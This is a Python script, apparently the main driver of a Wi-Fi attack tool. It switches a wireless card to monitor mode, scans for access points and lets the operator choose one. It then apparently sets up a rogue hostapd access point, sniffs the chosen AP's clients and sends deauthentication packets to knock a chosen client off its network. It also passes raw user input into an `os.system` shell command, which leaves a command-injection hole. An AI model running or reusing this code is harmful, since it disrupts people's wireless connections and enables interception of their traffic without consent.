#!/usr/bin/env python
import os
from scapy.all import get_if_list
import logging
from sys import platform
# import functions
from configs.config import setMonitorMode, updateHostAP, setManagerMode
from scanning.sniffing import sniffClients, scanNetworks
from spoofing.spoofing import setTarget

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def attack():

    print(f"list of available interfaces:\n{get_if_list()}")

    interface = wlan = input(bcolors.OKGREEN+"\nEnter full interface name to set to Monitor Mode: \n \n "+bcolors.ENDC)
    
    print(bcolors.OKCYAN+"\nSetting " + wlan + " to monitor mode!\n"+bcolors.ENDC)
    setMonitorMode(wlan)

    # print("\nIn order to change back card into regular wifi-mode run the following command after you are done: \n"
    #       "service NetworkManager restart\n")

    try:
        print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
        known = scanNetworks(interface)

    except KeyboardInterrupt:
        # print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
        pass

    # Let the user input the MAC address of the router
    print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
    BSSID = input(bcolors.OKGREEN+'\nChoose the BSSID/MAC address of the AP: \n\n'+bcolors.ENDC)

    print('\nChanging ' + wlan + ' to channel ' + str(known[BSSID][1]))
    os.system("iwconfig %s channel %d" % (wlan, known[BSSID][1]))

    updateHostAP(known, BSSID)
    
    print(bcolors.OKBLUE+"\nIntercepting AP clients data \n"+bcolors.ENDC)
    sniffClients(wlan, BSSID)

    brdMac = input(bcolors.OKGREEN+
        '\n\nChoose the MAC address of the client you wish to attack: \n\n'+bcolors.ENDC)

    print(bcolors.FAIL+'\nSending deauth packets now, press ctrl+c to end the attack'+bcolors.ENDC)

    setTarget(brdMac, interface, BSSID)

    print(bcolors.BOLD+bcolors.OKGREEN+"\nDONE! Reverting monitor card back to managed mode :)"+bcolors.ENDC + bcolors.ENDC)
    
    setManagerMode(wlan)
    print(bcolors.OKBLUE+"\n"+wlan + " is set back to managed mode"+bcolors.ENDC)
    


if __name__ == "__main__":
    attack()
